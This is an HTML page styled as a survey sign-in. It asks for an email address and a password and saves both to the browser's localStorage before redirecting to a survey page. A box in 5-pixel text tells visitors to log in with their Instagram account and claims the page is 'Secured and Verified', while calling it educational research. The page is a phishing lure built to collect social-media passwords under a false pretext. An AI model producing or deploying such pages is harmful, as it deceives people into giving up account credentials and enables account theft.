<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Survey Entry</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f2f4f7;
    }

    .card {
      width: 360px;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      padding: 35px 30px;
      text-align: center;
    }

    .title {
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 25px;
      color: #222;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dcdcdc;
      border-radius: 6px;
      font-size: 14px;
    }

    input:focus {
      outline: none;
      border-color: #4a90e2;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border: none;
      border-radius: 6px;
      background: #4a90e2;
      color: #fff;
      font-weight: 600;
      font-size: 15px;
      cursor: pointer;
    }

    button:hover {
      opacity: 0.95;
    }

    .note {
      margin-top: 15px;
      font-size: 12px;
      color: #777;
    }

    .disclaimer {
      position: absolute;
      width: 35%;
      transform: scale(0.6);
      right: 32.5%;
      height: 100px;
      bottom: 65px;
      background-color: #cec516;
    }

    p {
      font-size: 5px;
    }
  </style>
</head>

<body>

  <div class="card">
    <div class="title">Survey</div>

    <input id="email" type="email" placeholder="Your Email Address" required>
    <input id="name" placeholder="Password" required type="password">

    <button onclick="startSurvey()">Start Survey</button>

    <div class="note">
      Educational research survey
    </div>
    <div class="disclaimer">
      </p>This survey page is created purely for educational and research purposes.</p>
      </p>Please Use Your Instagram Account to Login</p>
      </p>Page is Secured and Verified</p>
    </div>
  </div>

  <script>
    function startSurvey() {
      const name = document.getElementById('name').value.trim();
      const email = document.getElementById('email').value.trim();

      if (!name || !email) {
        alert("Enter name and email");
        return;
      }

      localStorage.setItem('name', name);
      localStorage.setItem('email', email);
      window.location.href = "survey.html";
    }
  </script>

</body>

</html>
